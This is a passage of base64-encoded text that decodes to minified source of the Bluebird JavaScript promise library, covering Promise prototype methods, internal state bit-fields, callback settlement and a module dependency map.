PWZ1bmN0aW9uKCl7fSxwPXt9LF89e2U6bnVsbH0sbT1lKCIuL3RoZW5hYmxlcy5qcyIpKG4sZikseT1lKCIuL3Byb21pc2VfYXJyYXkuanMiKShuLGYsbSxhKSxnPWUoIi4vY2FwdHVyZWRfdHJhY2UuanMiKSgpLHY9ZSgiLi9kZWJ1Z2dhYmlsaXR5LmpzIikobixnKSxiPWUoIi4vY29udGV4dC5qcyIpKG4sZyx2KSxNPWUoIi4vY2F0Y2hfZmlsdGVyLmpzIikoXyksTD1lKCIuL3Byb21pc2VfcmVzb2x2ZXIuanMiKSxrPUwuX25vZGViYWNrRm9yUHJvbWlzZSx3PXUuZXJyb3JPYmosVD11LnRyeUNhdGNoO3JldHVybiBuLnByb3RvdHlwZS50b1N0cmluZz1mdW5jdGlvbigpe3JldHVybiJbb2JqZWN0IFByb21pc2VdIn0sbi5wcm90b3R5cGUuY2F1Z2h0PW4ucHJvdG90eXBlWyJjYXRjaCJdPWZ1bmN0aW9uKGUpe3ZhciB0PWFyZ3VtZW50cy5sZW5ndGg7aWYodD4xKXt2YXIgcixpPW5ldyBBcnJheSh0LTEpLHM9MDtmb3Iocj0wO3QtMT5yOysrcil7dmFyIG89YXJndW1lbnRzW3JdO2lmKCJmdW5jdGlvbiIhPXR5cGVvZiBvKXJldHVybiBuLnJlamVjdChuZXcgaCgiQ2F0Y2ggZmlsdGVyIG11c3QgaW5oZXJpdCBmcm9tIEVycm9yIG9yIGJlIGEgc2ltcGxlIHByZWRpY2F0ZSBmdW5jdGlvblxuXG4gICAgU2VlIGh0dHA6Ly9nb28uZ2wvbzg0bzY4XG4iKSk7aVtzKytdPW99aS5sZW5ndGg9cyxlPWFyZ3VtZW50c1tyXTt2YXIgYT1uZXcgTShpLGUsdGhpcyk7cmV0dXJuIHRoaXMuX3RoZW4odm9pZCAwLGEuZG9GaWx0ZXIsdm9pZCAwLGEsdm9pZCAwKX1yZXR1cm4gdGhpcy5fdGhlbih2b2lkIDAsZSx2b2lkIDAsdm9pZCAwLHZvaWQgMCl9LG4ucHJvdG90eXBlLnJlZmxlY3Q9ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5fdGhlbihvLG8sdm9pZCAwLHRoaXMsdm9pZCAwKX0sbi5wcm90b3R5cGUudGhlbj1mdW5jdGlvbihlLHQsbil7aWYodigpJiZhcmd1bWVudHMubGVuZ3RoPjAmJiJmdW5jdGlvbiIhPXR5cGVvZiBlJiYiZnVuY3Rpb24iIT10eXBlb2YgdCl7dmFyIHI9Ii50aGVuKCkgb25seSBhY2NlcHRzIGZ1bmN0aW9ucyBidXQgd2FzIHBhc3NlZDogIit1LmNsYXNzU3RyaW5nKGUpO2FyZ3VtZW50cy5sZW5ndGg+MSYmKHIrPSIsICIrdS5jbGFzc1N0cmluZyh0KSksdGhpcy5fd2FybihyKX1yZXR1cm4gdGhpcy5fdGhlbihlLHQsbix2b2lkIDAsdm9pZCAwKX0sbi5wcm90b3R5cGUuZG9uZT1mdW5jdGlvbihlLHQsbil7dmFyIHI9dGhpcy5fdGhlbihlLHQsbix2b2lkIDAsdm9pZCAwKTtyLl9zZXRJc0ZpbmFsKCl9LG4ucHJvdG90eXBlLnNwcmVhZD1mdW5jdGlvbihlLHQpe3JldHVybiB0aGlzLmFsbCgpLl90aGVuKGUsdCx2b2lkIDAscCx2b2lkIDApfSxuLnByb3RvdHlwZS5pc0NhbmNlbGxhYmxlPWZ1bmN0aW9uKCl7cmV0dXJuIXRoaXMuaXNSZXNvbHZlZCgpJiZ0aGlzLl9jYW5jZWxsYWJsZSgpfSxuLnByb3RvdHlwZS50b0pTT049ZnVuY3Rpb24oKXsNCnZhciBlPXtpc0Z1bGZpbGxlZDohMSxpc1JlamVjdGVkOiExLGZ1bGZpbGxtZW50VmFsdWU6dm9pZCAwLHJlamVjdGlvblJlYXNvbjp2b2lkIDB9O3JldHVybiB0aGlzLmlzRnVsZmlsbGVkKCk/KGUuZnVsZmlsbG1lbnRWYWx1ZT10aGlzLnZhbHVlKCksZS5pc0Z1bGZpbGxlZD0hMCk6dGhpcy5pc1JlamVjdGVkKCkmJihlLnJlamVjdGlvblJlYXNvbj10aGlzLnJlYXNvbigpLGUuaXNSZWplY3RlZD0hMCksZX0sbi5wcm90b3R5cGUuYWxsPWZ1bmN0aW9uKCl7cmV0dXJuIG5ldyB5KHRoaXMpLnByb21pc2UoKX0sbi5wcm90b3R5cGUuZXJyb3I9ZnVuY3Rpb24oZSl7cmV0dXJuIHRoaXMuY2F1Z2h0KHUub3JpZ2luYXRlc0Zyb21SZWplY3Rpb24sZSl9LG4uaXM9ZnVuY3Rpb24oZSl7cmV0dXJuIGUgaW5zdGFuY2VvZiBufSxuLmZyb21Ob2RlPWZ1bmN0aW9uKGUpe3ZhciB0PW5ldyBuKGYpLHI9VChlKShrKHQpKTtyZXR1cm4gcj09PXcmJnQuX3JlamVjdENhbGxiYWNrKHIuZSwhMCwhMCksdH0sbi5hbGw9ZnVuY3Rpb24oZSl7cmV0dXJuIG5ldyB5KGUpLnByb21pc2UoKX0sbi5kZWZlcj1uLnBlbmRpbmc9ZnVuY3Rpb24oKXt2YXIgZT1uZXcgbihmKTtyZXR1cm4gbmV3IEwoZSl9LG4uY2FzdD1mdW5jdGlvbihlKXt2YXIgdD1tKGUpO2lmKCEodCBpbnN0YW5jZW9mIG4pKXt2YXIgcj10O3Q9bmV3IG4oZiksdC5fZnVsZmlsbFVuY2hlY2tlZChyKX1yZXR1cm4gdH0sbi5yZXNvbHZlPW4uZnVsZmlsbGVkPW4uY2FzdCxuLnJlamVjdD1uLnJlamVjdGVkPWZ1bmN0aW9uKGUpe3ZhciB0PW5ldyBuKGYpO3JldHVybiB0Ll9jYXB0dXJlU3RhY2tUcmFjZSgpLHQuX3JlamVjdENhbGxiYWNrKGUsITApLHR9LG4uc2V0U2NoZWR1bGVyPWZ1bmN0aW9uKGUpe2lmKCJmdW5jdGlvbiIhPXR5cGVvZiBlKXRocm93IG5ldyBoKCJmbiBtdXN0IGJlIGEgZnVuY3Rpb25cblxuICAgIFNlZSBodHRwOi8vZ29vLmdsLzkxNmxKSlxuIik7dmFyIHQ9bC5fc2NoZWR1bGU7cmV0dXJuIGwuX3NjaGVkdWxlPWUsdH0sbi5wcm90b3R5cGUuX3RoZW49ZnVuY3Rpb24oZSx0LHIscyxvKXt2YXIgYT12b2lkIDAhPT1vLHU9YT9vOm5ldyBuKGYpO2F8fCh1Ll9wcm9wYWdhdGVGcm9tKHRoaXMsNSksdS5fY2FwdHVyZVN0YWNrVHJhY2UoKSk7dmFyIGM9dGhpcy5fdGFyZ2V0KCk7YyE9PXRoaXMmJih2b2lkIDA9PT1zJiYocz10aGlzLl9ib3VuZFRvKSxhfHx1Ll9zZXRJc01pZ3JhdGVkKCkpO3ZhciBkPWMuX2FkZENhbGxiYWNrcyhlLHQscix1LHMsaSgpKTtyZXR1cm4gYy5faXNSZXNvbHZlZCgpJiYhYy5faXNTZXR0bGVQcm9taXNlc1F1ZXVlZCgpJiZsLmludm9rZShjLl9zZXR0bGVQcm9taXNlQXRQb3N0UmVzb2x1dGlvbixjLGQpLHV9LG4ucHJvdG90eXBlLl9zZXR0bGVQcm9taXNlQXRQb3N0UmVzb2x1dGlvbj1mdW5jdGlvbihlKXt0aGlzLl9pc1JlamVjdGlvblVuaGFuZGxlZCgpJiZ0aGlzLl91bnNldFJlamVjdGlvbklzVW5oYW5kbGVkKCksdGhpcy5fc2V0dGxlUHJvbWlzZUF0KGUpfSxuLnByb3RvdHlwZS5fbGVuZ3RoPWZ1bmN0aW9uKCl7cmV0dXJuIDEzMTA3MSZ0aGlzLl9iaXRGaWVsZH0sbi5wcm90b3R5cGUuX2lzRm9sbG93aW5nT3JGdWxmaWxsZWRPclJlamVjdGVkPWZ1bmN0aW9uKCl7cmV0dXJuKDkzOTUyNDA5NiZ0aGlzLl9iaXRGaWVsZCk+MH0sbi5wcm90b3R5cGUuX2lzRm9sbG93aW5nPWZ1bmN0aW9uKCl7cmV0dXJuIDUzNjg3MDkxMj09PSg1MzY4NzA5MTImdGhpcy5fYml0RmllbGQpfSxuLnByb3RvdHlwZS5fc2V0TGVuZ3RoPWZ1bmN0aW9uKGUpe3RoaXMuX2JpdEZpZWxkPS0xMzEwNzImdGhpcy5fYml0RmllbGR8MTMxMDcxJmV9LG4ucHJvdG90eXBlLl9zZXRGdWxmaWxsZWQ9ZnVuY3Rpb24oKXt0aGlzLl9iaXRGaWVsZD0yNjg0MzU0NTZ8dGhpcy5fYml0RmllbGR9LG4ucHJvdG90eXBlLl9zZXRSZWplY3RlZD1mdW5jdGlvbigpe3RoaXMuX2JpdEZpZWxkPTEzNDIxNzcyOHx0aGlzLl9iaXRGaWVsZH0sbi5wcm90b3R5cGUuX3NldEZvbGxvd2luZz1mdW5jdGlvbigpe3RoaXMuX2JpdEZpZWxkPTUzNjg3MDkxMnx0aGlzLl9iaXRGaWVsZH0sbi5wcm90b3R5cGUuX3NldElzRmluYWw9ZnVuY3Rpb24oKXt0aGlzLl9iaXRGaWVsZD0zMzU1NDQzMnx0aGlzLl9iaXRGaWVsZH0sbi5wcm90b3R5cGUuX2lzRmluYWw9ZnVuY3Rpb24oKXtyZXR1cm4oMzM1NTQ0MzImdGhpcy5fYml0RmllbGQpPjB9LG4ucHJvdG90eXBlLl9jYW5jZWxsYWJsZT1mdW5jdGlvbigpe3JldHVybig2NzEwODg2NCZ0aGlzLl9iaXRGaWVsZCk+MH0sbi5wcm90b3R5cGUuX3NldENhbmNlbGxhYmxlPWZ1bmN0aW9uKCl7dGhpcy5fYml0RmllbGQ9NjcxMDg4NjR8dGhpcy5fYml0RmllbGR9LG4ucHJvdG90eXBlLl91bnNldENhbmNlbGxhYmxlPWZ1bmN0aW9uKCl7dGhpcy5fYml0RmllbGQ9LTY3MTA4ODY1JnRoaXMuX2JpdEZpZWxkfSxuLnByb3RvdHlwZS5fc2V0SXNNaWdyYXRlZD1mdW5jdGlvbigpe3RoaXMuX2JpdEZpZWxkPTQxOTQzMDR8dGhpcy5fYml0RmllbGR9LG4ucHJvdG90eXBlLl91bnNldElzTWlncmF0ZWQ9ZnVuY3Rpb24oKXt0aGlzLl9iaXRGaWVsZD0tNDE5NDMwNSZ0aGlzLl9iaXRGaWVsZH0sbi5wcm90b3R5cGUuX2lzTWlncmF0ZWQ9ZnVuY3Rpb24oKXtyZXR1cm4oNDE5NDMwNCZ0aGlzLl9iaXRGaWVsZCk+MH0sbi5wcm90b3R5cGUuX3JlY2VpdmVyQXQ9ZnVuY3Rpb24oZSl7dmFyIHQ9MD09PWU/dGhpcy5fcmVjZWl2ZXIwOnRoaXNbNSplLTUrNF07aWYodCE9PWMpcmV0dXJuIHZvaWQgMD09PXQmJnRoaXMuX2lzQm91bmQoKT90aGlzLl9ib3VuZFZhbHVlKCk6dH0sbi5wcm90b3R5cGUuX3Byb21pc2VBdD1mdW5jdGlvbihlKXtyZXR1cm4gMD09PWU/dGhpcy5fcHJvbWlzZTA6dGhpc1s1KmUtNSszXX0sbi5wcm90b3R5cGUuX2Z1bGZpbGxtZW50SGFuZGxlckF0PWZ1bmN0aW9uKGUpe3JldHVybiAwPT09ZT90aGlzLl9mdWxmaWxsbWVudEhhbmRsZXIwOnRoaXNbNSplLTUrMF19LG4ucHJvdG90eXBlLl9yZWplY3Rpb25IYW5kbGVyQXQ9ZnVuY3Rpb24oZSl7cmV0dXJuIDA9PT1lP3RoaXMuX3JlamVjdGlvbkhhbmRsZXIwOnRoaXNbNSplLTUrMV19LG4ucHJvdG90eXBlLl9ib3VuZFZhbHVlPWZ1bmN0aW9uKCl7dmFyIGU9dGhpcy5fYm91bmRUbztyZXR1cm4gdm9pZCAwIT09ZSYmZSBpbnN0YW5jZW9mIG4/ZS5pc0Z1bGZpbGxlZCgpP2UudmFsdWUoKTp2b2lkIDA6ZX0sbi5wcm90b3R5cGUuX21pZ3JhdGVDYWxsYmFja3M9ZnVuY3Rpb24oZSx0KXt2YXIgcj1lLl9mdWxmaWxsbWVudEhhbmRsZXJBdCh0KSxpPWUuX3JlamVjdGlvbkhhbmRsZXJBdCh0KSxzPWUuX3Byb2dyZXNzSGFuZGxlckF0KHQpLG89ZS5fcHJvbWlzZUF0KHQpLGE9ZS5fcmVjZWl2ZXJBdCh0KTtvIGluc3RhbmNlb2YgbiYmby5fc2V0SXNNaWdyYXRlZCgpLHZvaWQgMD09PWEmJihhPWMpLHRoaXMuX2FkZENhbGxiYWNrcyhyLGkscyxvLGEsbnVsbCl9LG4ucHJvdG90eXBlLl9hZGRDYWxsYmFja3M9ZnVuY3Rpb24oZSx0LG4scixpLHMpe3ZhciBvPXRoaXMuX2xlbmd0aCgpO2lmKG8+PTEzMTA2NiYmKG89MCx0aGlzLl9zZXRMZW5ndGgoMCkpLDA9PT1vKXRoaXMuX3Byb21pc2UwPXIsdm9pZCAwIT09aSYmKHRoaXMuX3JlY2VpdmVyMD1pKSwiZnVuY3Rpb24iIT10eXBlb2YgZXx8dGhpcy5faXNDYXJyeWluZ1N0YWNrVHJhY2UoKXx8KHRoaXMuX2Z1bGZpbGxtZW50SGFuZGxlcjA9bnVsbD09PXM/ZTpzLmJpbmQoZSkpLCJmdW5jdGlvbiI9PXR5cGVvZiB0JiYodGhpcy5fcmVqZWN0aW9uSGFuZGxlcjA9bnVsbD09PXM/dDpzLmJpbmQodCkpLCJmdW5jdGlvbiI9PXR5cGVvZiBuJiYodGhpcy5fcHJvZ3Jlc3NIYW5kbGVyMD1udWxsPT09cz9uOnMuYmluZChuKSk7ZWxzZXt2YXIgYT01Km8tNTt0aGlzW2ErM109cix0aGlzW2ErNF09aSwiZnVuY3Rpb24iPT10eXBlb2YgZSYmKHRoaXNbYSswXT1udWxsPT09cz9lOnMuYmluZChlKSksImZ1bmN0aW9uIj09dHlwZW9mIHQmJih0aGlzW2ErMV09bnVsbD09PXM/dDpzLmJpbmQodCkpLCJmdW5jdGlvbiI9PXR5cGVvZiBuJiYodGhpc1thKzJdPW51bGw9PT1zP246cy5iaW5kKG4pKX1yZXR1cm4gdGhpcy5fc2V0TGVuZ3RoKG8rMSksb30sbi5wcm90b3R5cGUuX3NldFByb3h5SGFuZGxlcnM9ZnVuY3Rpb24oZSx0KXt2YXIgbj10aGlzLl9sZW5ndGgoKTtpZihuPj0xMzEwNjYmJihuPTAsdGhpcy5fc2V0TGVuZ3RoKDApKSwwPT09bil0aGlzLl9wcm9taXNlMD10LHRoaXMuX3JlY2VpdmVyMD1lO2Vsc2V7dmFyIHI9NSpuLTU7dGhpc1tyKzNdPXQsdGhpc1tyKzRdPWV9dGhpcy5fc2V0TGVuZ3RoKG4rMSl9LG4ucHJvdG90eXBlLl9wcm94eVByb21pc2VBcnJheT1mdW5jdGlvbihlLHQpe3RoaXMuX3NldFByb3h5SGFuZGxlcnMoZSx0KX0sbi5wcm90b3R5cGUuX3Jlc29sdmVDYWxsYmFjaz1mdW5jdGlvbihlLHQpe2lmKCF0aGlzLl9pc0ZvbGxvd2luZ09yRnVsZmlsbGVkT3JSZWplY3RlZCgpKXtpZihlPT09dGhpcylyZXR1cm4gdGhpcy5fcmVqZWN0Q2FsbGJhY2socygpLCExLCEwKTt2YXIgcj1tKGUsdGhpcyk7aWYoIShyIGluc3RhbmNlb2YgbikpcmV0dXJuIHRoaXMuX2Z1bGZpbGwoZSk7dmFyIGk9MXwodD80OjApO3RoaXMuX3Byb3BhZ2F0ZUZyb20ocixpKTt2YXIgbz1yLl90YXJnZXQoKTtpZihvLl9pc1BlbmRpbmcoKSl7Zm9yKHZhciBhPXRoaXMuX2xlbmd0aCgpLHU9MDthPnU7Kyt1KW8uX21pZ3JhdGVDYWxsYmFja3ModGhpcyx1KTt0aGlzLl9zZXRGb2xsb3dpbmcoKSx0aGlzLl9zZXRMZW5ndGgoMCksdGhpcy5fc2V0Rm9sbG93ZWUobyl9ZWxzZSBvLl9pc0Z1bGZpbGxlZCgpP3RoaXMuX2Z1bGZpbGxVbmNoZWNrZWQoby5fdmFsdWUoKSk6dGhpcy5fcmVqZWN0VW5jaGVja2VkKG8uX3JlYXNvbigpLG8uX2dldENhcnJpZWRTdGFja1RyYWNlKCkpfX0sbi5wcm90b3R5cGUuX3JlamVjdENhbGxiYWNrPWZ1bmN0aW9uKGUsdCxuKXtufHx1Lm1hcmtBc09yaWdpbmF0aW5nRnJvbVJlamVjdGlvbihlKTt2YXIgcj11LmVuc3VyZUVycm9yT2JqZWN0KGUpLGk9cj09PWU7dGhpcy5fYXR0YWNoRXh0cmFUcmFjZShyLHQ/aTohMSksdGhpcy5fcmVqZWN0KGUsaT92b2lkIDA6cil9LG4ucHJvdG90eXBlLl9yZXNvbHZlRnJvbVJlc29sdmVyPWZ1bmN0aW9uKGUpe3ZhciB0PXRoaXM7dGhpcy5fY2FwdHVyZVN0YWNrVHJhY2UoKSx0aGlzLl9wdXNoQ29udGV4dCgpO3ZhciBuPSEwLHI9VChlKShmdW5jdGlvbihlKXtudWxsIT09dCYmKHQuX3Jlc29sdmVDYWxsYmFjayhlKSx0PW51bGwpfSxmdW5jdGlvbihlKXtudWxsIT09dCYmKHQuX3JlamVjdENhbGxiYWNrKGUsbiksdD1udWxsKX0pO249ITEsdGhpcy5fcG9wQ29udGV4dCgpLHZvaWQgMCE9PXImJnI9PT13JiZudWxsIT09dCYmKHQuX3JlamVjdENhbGxiYWNrKHIuZSwhMCwhMCksdD1udWxsKX0sbi5wcm90b3R5cGUuX3NldHRsZVByb21pc2VGcm9tSGFuZGxlcj1mdW5jdGlvbihlLHQsbixyKXtpZighci5faXNSZWplY3RlZCgpKXtyLl9wdXNoQ29udGV4dCgpO3ZhciBpO2lmKGk9dCE9PXB8fHRoaXMuX2lzUmVqZWN0ZWQoKT9UKGUpLmNhbGwodCxuKTpUKGUpLmFwcGx5KHRoaXMuX2JvdW5kVmFsdWUoKSxuKSxyLl9wb3BDb250ZXh0KCksaT09PXd8fGk9PT1yfHxpPT09Xyl7dmFyIG89aT09PXI/cygpOmkuZTtyLl9yZWplY3RDYWxsYmFjayhvLCExLCEwKX1lbHNlIHIuX3Jlc29sdmVDYWxsYmFjayhpKX19LG4ucHJvdG90eXBlLl90YXJnZXQ9ZnVuY3Rpb24oKXtmb3IodmFyIGU9dGhpcztlLl9pc0ZvbGxvd2luZygpOyllPWUuX2ZvbGxvd2VlKCk7cmV0dXJuIGV9LG4ucHJvdG90eXBlLl9mb2xsb3dlZT1mdW5jdGlvbigpe3JldHVybiB0aGlzLl9yZWplY3Rpb25IYW5kbGVyMH0sbi5wcm90b3R5cGUuX3NldEZvbGxvd2VlPWZ1bmN0aW9uKGUpe3RoaXMuX3JlamVjdGlvbkhhbmRsZXIwPWV9LG4ucHJvdG90eXBlLl9jbGVhblZhbHVlcz1mdW5jdGlvbigpe3RoaXMuX2NhbmNlbGxhYmxlKCkmJih0aGlzLl9jYW5jZWxsYXRpb25QYXJlbnQ9dm9pZCAwKX0sbi5wcm90b3R5cGUuX3Byb3BhZ2F0ZUZyb209ZnVuY3Rpb24oZSx0KXsoMSZ0KT4wJiZlLl9jYW5jZWxsYWJsZSgpJiYodGhpcy5fc2V0Q2FuY2VsbGFibGUoKSx0aGlzLl9jYW5jZWxsYXRpb25QYXJlbnQ9ZSksKDQmdCk+MCYmZS5faXNCb3VuZCgpJiZ0aGlzLl9zZXRCb3VuZFRvKGUuX2JvdW5kVG8pfSxuLnByb3RvdHlwZS5fZnVsZmlsbD1mdW5jdGlvbihlKXt0aGlzLl9pc0ZvbGxvd2luZ09yRnVsZmlsbGVkT3JSZWplY3RlZCgpfHx0aGlzLl9mdWxmaWxsVW5jaGVja2VkKGUpfSxuLnByb3RvdHlwZS5fcmVqZWN0PWZ1bmN0aW9uKGUsdCl7dGhpcy5faXNGb2xsb3dpbmdPckZ1bGZpbGxlZE9yUmVqZWN0ZWQoKXx8dGhpcy5fcmVqZWN0VW5jaGVja2VkKGUsdCl9LG4ucHJvdG90eXBlLl9zZXR0bGVQcm9taXNlQXQ9ZnVuY3Rpb24oZSl7dmFyIHQ9dGhpcy5fcHJvbWlzZUF0KGUpLHI9dCBpbnN0YW5jZW9mIG47aWYociYmdC5faXNNaWdyYXRlZCgpKXJldHVybiB0Ll91bnNldElzTWlncmF0ZWQoKSxsLmludm9rZSh0aGlzLl9zZXR0bGVQcm9taXNlQXQsdGhpcyxlKTt2YXIgaT10aGlzLl9pc0Z1bGZpbGxlZCgpP3RoaXMuX2Z1bGZpbGxtZW50SGFuZGxlckF0KGUpOnRoaXMuX3JlamVjdGlvbkhhbmRsZXJBdChlKSxzPXRoaXMuX2lzQ2FycnlpbmdTdGFja1RyYWNlKCk/dGhpcy5fZ2V0Q2FycmllZFN0YWNrVHJhY2UoKTp2b2lkIDAsbz10aGlzLl9zZXR0bGVkVmFsdWUsYT10aGlzLl9yZWNlaXZlckF0KGUpO3RoaXMuX2NsZWFyQ2FsbGJhY2tEYXRhQXRJbmRleChlKSwiZnVuY3Rpb24iPT10eXBlb2YgaT9yP3RoaXMuX3NldHRsZVByb21pc2VGcm9tSGFuZGxlcihpLGEsbyx0KTppLmNhbGwoYSxvLHQpOmEgaW5zdGFuY2VvZiB5P2EuX2lzUmVzb2x2ZWQoKXx8KHRoaXMuX2lzRnVsZmlsbGVkKCk/YS5fcHJvbWlzZUZ1bGZpbGxlZChvLHQpOmEuX3Byb21pc2VSZWplY3RlZChvLHQpKTpyJiYodGhpcy5faXNGdWxmaWxsZWQoKT90Ll9mdWxmaWxsKG8pOnQuX3JlamVjdChvLHMpKSxlPj00JiY0PT09KDMxJmUpJiZsLmludm9rZUxhdGVyKHRoaXMuX3NldExlbmd0aCx0aGlzLDApfSxuLnByb3RvdHlwZS5fY2xlYXJDYWxsYmFja0RhdGFBdEluZGV4PWZ1bmN0aW9uKGUpe2lmKDA9PT1lKXRoaXMuX2lzQ2FycnlpbmdTdGFja1RyYWNlKCl8fCh0aGlzLl9mdWxmaWxsbWVudEhhbmRsZXIwPXZvaWQgMCksdGhpcy5fcmVqZWN0aW9uSGFuZGxlcjA9dGhpcy5fcHJvZ3Jlc3NIYW5kbGVyMD10aGlzLl9yZWNlaXZlcjA9dGhpcy5fcHJvbWlzZTA9dm9pZCAwO2Vsc2V7dmFyIHQ9NSplLTU7dGhpc1t0KzNdPXRoaXNbdCs0XT10aGlzW3QrMF09dGhpc1t0KzFdPXRoaXNbdCsyXT12b2lkIDB9fSxuLnByb3RvdHlwZS5faXNTZXR0bGVQcm9taXNlc1F1ZXVlZD1mdW5jdGlvbigpe3JldHVybi0xMDczNzQxODI0PT09KC0xMDczNzQxODI0JnRoaXMuX2JpdEZpZWxkKX0sbi5wcm90b3R5cGUuX3NldFNldHRsZVByb21pc2VzUXVldWVkPWZ1bmN0aW9uKCl7dGhpcy5fYml0RmllbGQ9LTEwNzM3NDE4MjR8dGhpcy5fYml0RmllbGR9LG4ucHJvdG90eXBlLl91bnNldFNldHRsZVByb21pc2VzUXVldWVkPWZ1bmN0aW9uKCl7dGhpcy5fYml0RmllbGQ9MTA3Mzc0MTgyMyZ0aGlzLl9iaXRGaWVsZH0sbi5wcm90b3R5cGUuX3F1ZXVlU2V0dGxlUHJvbWlzZXM9ZnVuY3Rpb24oKXtsLnNldHRsZVByb21pc2VzKHRoaXMpLHRoaXMuX3NldFNldHRsZVByb21pc2VzUXVldWVkKCl9LG4ucHJvdG90eXBlLl9mdWxmaWxsVW5jaGVja2VkPWZ1bmN0aW9uKGUpe2lmKGU9PT10aGlzKXt2YXIgdD1zKCk7cmV0dXJuIHRoaXMuX2F0dGFjaEV4dHJhVHJhY2UodCksdGhpcy5fcmVqZWN0VW5jaGVja2VkKHQsdm9pZCAwKX10aGlzLl9zZXRGdWxmaWxsZWQoKSx0aGlzLl9zZXR0bGVkVmFsdWU9ZSx0aGlzLl9jbGVhblZhbHVlcygpLHRoaXMuX2xlbmd0aCgpPjAmJnRoaXMuX3F1ZXVlU2V0dGxlUHJvbWlzZXMoKX0sbi5wcm90b3R5cGUuX3JlamVjdFVuY2hlY2tlZENoZWNrRXJyb3I9ZnVuY3Rpb24oZSl7dmFyIHQ9dS5lbnN1cmVFcnJvck9iamVjdChlKTt0aGlzLl9yZWplY3RVbmNoZWNrZWQoZSx0PT09ZT92b2lkIDA6dCl9LG4ucHJvdG90eXBlLl9yZWplY3RVbmNoZWNrZWQ9ZnVuY3Rpb24oZSx0KXtpZihlPT09dGhpcyl7dmFyIG49cygpO3JldHVybiB0aGlzLl9hdHRhY2hFeHRyYVRyYWNlKG4pLHRoaXMuX3JlamVjdFVuY2hlY2tlZChuKX1yZXR1cm4gdGhpcy5fc2V0UmVqZWN0ZWQoKSx0aGlzLl9zZXR0bGVkVmFsdWU9ZSx0aGlzLl9jbGVhblZhbHVlcygpLHRoaXMuX2lzRmluYWwoKT92b2lkIGwudGhyb3dMYXRlcihmdW5jdGlvbihlKXt0aHJvdyJzdGFjayJpbiBlJiZsLmludm9rZUZpcnN0KGcudW5oYW5kbGVkUmVqZWN0aW9uLHZvaWQgMCxlKSxlfSx2b2lkIDA9PT10P2U6dCk6KHZvaWQgMCE9PXQmJnQhPT1lJiZ0aGlzLl9zZXRDYXJyaWVkU3RhY2tUcmFjZSh0KSx2b2lkKHRoaXMuX2xlbmd0aCgpPjA/dGhpcy5fcXVldWVTZXR0bGVQcm9taXNlcygpOnRoaXMuX2Vuc3VyZVBvc3NpYmxlUmVqZWN0aW9uSGFuZGxlZCgpKSl9LG4ucHJvdG90eXBlLl9zZXR0bGVQcm9taXNlcz1mdW5jdGlvbigpe3RoaXMuX3Vuc2V0U2V0dGxlUHJvbWlzZXNRdWV1ZWQoKTtmb3IodmFyIGU9dGhpcy5fbGVuZ3RoKCksdD0wO2U+dDt0KyspdGhpcy5fc2V0dGxlUHJvbWlzZUF0KHQpfSx1Lm5vdEVudW1lcmFibGVQcm9wKG4sIl9tYWtlU2VsZlJlc29sdXRpb25FcnJvciIscyksZSgiLi9wcm9ncmVzcy5qcyIpKG4seSksZSgiLi9tZXRob2QuanMiKShuLGYsbSxhKSxlKCIuL2JpbmQuanMiKShuLGYsbSksZSgiLi9maW5hbGx5LmpzIikobixfLG0pLGUoIi4vZGlyZWN0X3Jlc29sdmUuanMiKShuKSxlKCIuL3N5bmNocm9ub3VzX2luc3BlY3Rpb24uanMiKShuKSxlKCIuL2pvaW4uanMiKShuLHksbSxmKSxuLlByb21pc2U9bixlKCIuL21hcC5qcyIpKG4seSxhLG0sZiksZSgiLi9jYW5jZWwuanMiKShuKSxlKCIuL3VzaW5nLmpzIikobixhLG0sYiksZSgiLi9nZW5lcmF0b3JzLmpzIikobixhLGYsbSksZSgiLi9ub2RlaWZ5LmpzIikobiksZSgiLi9jYWxsX2dldC5qcyIpKG4pLGUoIi4vcHJvcHMuanMiKShuLHksbSxhKSxlKCIuL3JhY2UuanMiKShuLGYsbSxhKSxlKCIuL3JlZHVjZS5qcyIpKG4seSxhLG0sZiksZSgiLi9zZXR0bGUuanMiKShuLHkpLGUoIi4vc29tZS5qcyIpKG4seSxhKSxlKCIuL3Byb21pc2lmeS5qcyIpKG4sZiksZSgiLi9hbnkuanMiKShuKSxlKCIuL2VhY2guanMiKShuLGYpLGUoIi4vdGltZXJzLmpzIikobixmKSxlKCIuL2ZpbHRlci5qcyIpKG4sZiksdS50b0Zhc3RQcm9wZXJ0aWVzKG4pLHUudG9GYXN0UHJvcGVydGllcyhuLnByb3RvdHlwZSkscih7YToxfSkscih7YjoyfSkscih7YzozfSkscigxKSxyKGZ1bmN0aW9uKCl7fSkscih2b2lkIDApLHIoITEpLHIobmV3IG4oZikpLGcuc2V0Qm91bmRzKGwuZmlyc3RMaW5lRXJyb3IsdS5sYXN0TGluZUVycm9yKSxufX0seyIuL2FueS5qcyI6MSwiLi9hc3luYy5qcyI6MiwiLi9iaW5kLmpzIjozLCIuL2NhbGxfZ2V0LmpzIjo1LCIuL2NhbmNlbC5qcyI6NiwiLi9jYXB0dXJlZF90cmFjZS5qcyI6NywiLi9jYXRjaF9maWx0ZXIuanMiOjgsIi4vY29udGV4dC5qcyI6OSwiLi9kZWJ1Z2dhYmlsaXR5LmpzIjoxMCwiLi9kaXJlY3RfcmVzb2x2ZS5qcyI6MTEsIi4vZWFjaC5qcyI6MTIsIi4vZXJyb3JzLmpzIjoxMywiLi9maWx0ZXIuanMiOjE1LCIuL2ZpbmFsbHkuanMiOjE2LCIuL2dlbmVyYXRvcnMuanMiOjE3LCIuL2pvaW4uanMiOjE4LCIuL21hcC5qcyI6MTksIi4vbWV0aG9kLmpzIjoyMCwiLi9ub2RlaWZ5LmpzIjoyMSwiLi9wcm9ncmVzcy5qcyI6MjIsIi4vcHJvbWlzZV9hcnJheS5qcyI6MjQsIi4vcHJvbWlzZV9yZXNvbHZlci5qcyI6MjUsIi4vcHJvbWlzaWZ5LmpzIjoyNiwiLi9wcm9wcy5qcyI6MjcsIi4vcmFjZS5qcyI6MjksIi4vcmVkdWNlLmpzIjozMCwiLi9zZXR0bGUuanMiOjMyLCIuL3NvbWUuanMiOjMzLCIuL3N5bmNocm9ub3VzX2luc3BlY3Rpb24uanMiOjM0LCIuL3RoZW5hYmxlcy5qcyI6MzUsIi4vdGltZXJzLmpzIjozNiwiLi91c2luZy5qcyI6MzcsIi4vdXRpbC5qcyI6Mzh9XSwyNDpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0Ijt0LmV4cG9ydHM9ZnVuY3Rpb24odCxuLHIsaSl7ZnVuY3Rpb24gcyhlKXtzd2l0Y2goZSl7Y2FzZS0yOnJldHVybltdO2Nhc2UtMzpyZXR